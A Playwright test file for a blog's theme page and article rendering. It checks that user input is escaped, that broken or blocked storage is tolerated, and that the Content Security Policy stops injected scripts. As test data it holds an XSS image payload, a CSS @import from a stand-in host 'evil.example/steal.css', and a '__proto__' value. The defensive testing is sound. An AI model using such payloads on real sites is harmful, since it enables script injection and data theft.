import { expect, test } from '@playwright/test';

test('theme names remain text and unsafe CSS is rejected', async ({ page }) => {
  const errors: string[] = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.goto('/themes');
  const payload = '<img src=x onerror="window.xss=true">';
  await page.locator('#theme-name').fill(payload);
  await page.locator('#theme-css').fill(':root { --color-page-bg: rgb(1, 2, 3); }');
  await page.locator('#add-theme-btn').click();
  const card = page.locator('.theme-card').filter({ hasText: payload });
  await expect(card).toHaveCount(1);
  await expect(card.locator('img')).toHaveCount(0);
  await card.click();
  await page.reload();
  await expect(page.locator('.theme-card.is-active')).toContainText(payload);
  await expect.poll(() => page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--color-page-bg').trim())).toBe('rgb(1, 2, 3)');
  await page.locator('#theme-name').fill('unsafe');
  await page.locator('#theme-css').fill('@import "https://evil.example/steal.css";');
  page.once('dialog', dialog => dialog.accept());
  await page.locator('#add-theme-btn').click();
  await expect(page.locator('.theme-card')).toHaveCount(4);
  expect(errors).toEqual([]);
});

test('malformed or blocked storage cannot break the list and language control', async ({ page }) => {
  const errors: string[] = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.addInitScript(() => {
    Object.defineProperty(window, 'localStorage', { get() { throw new Error('Storage denied'); } });
  });
  await page.goto('/');
  await expect(page.locator('#post-list')).toBeVisible();
  await page.locator('#text-search').fill('add two numbers');
  await expect(page.locator('.file-row:visible')).toHaveCount(1);
  await page.locator('#lang-toggle').click();
  await expect(page.locator('.file-row:visible')).toContainText('Add Two Numbers');
  expect(errors).toEqual([]);
});

test('corrupt stored themes are ignored', async ({ page }) => {
  await page.addInitScript(() => {
    localStorage.setItem('customThemes', 'null');
    localStorage.setItem('activeThemeId', '__proto__');
    localStorage.setItem('tagPreference', 'null');
  });
  await page.goto('/themes');
  await expect(page.locator('.theme-card')).toHaveCount(3);
  await page.goto('/');
  await expect(page.locator('#post-list')).toBeVisible();
});

for (const width of [1280, 390]) {
  test(`built pages render assets and enforce CSP at ${width}px`, async ({ page }) => {
    await page.setViewportSize({ width, height: 900 });
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    page.on('console', message => { if (message.type() === 'error') errors.push(message.text()); });
    await page.goto('/range-sum-query-2d---immutable');
    await expect(page.locator('pre.astro-code').first()).toBeVisible();
    await expect(page.locator('.katex').first()).toBeVisible();
    await expect.poll(() => page.locator('article img').evaluateAll(images => images.every(image => (image as HTMLImageElement).complete && (image as HTMLImageElement).naturalWidth > 0))).toBe(true);
    expect(await page.locator('article img').count()).toBeGreaterThan(0);
    await page.screenshot({ path: `test-results/article-${width}.png`, fullPage: true });
    await page.goto('/themes');
    await page.locator('.theme-card[data-id="light"]').click();
    await expect(page.locator('html')).toHaveClass(/light/);
    await page.locator('.theme-card[data-id="game"]').click();
    await page.reload();
    await expect(page.locator('.theme-card.is-active')).toHaveAttribute('data-id', 'game');
    await page.screenshot({ path: `test-results/themes-${width}.png`, fullPage: true });
    expect(errors).toEqual([]);
    await page.evaluate(() => {
      const script = document.createElement('script');
      script.textContent = 'window.injectedScriptRan = true';
      document.head.appendChild(script);
    });
    expect(await page.evaluate(() => (window as any).injectedScriptRan)).toBeUndefined();
  });
}
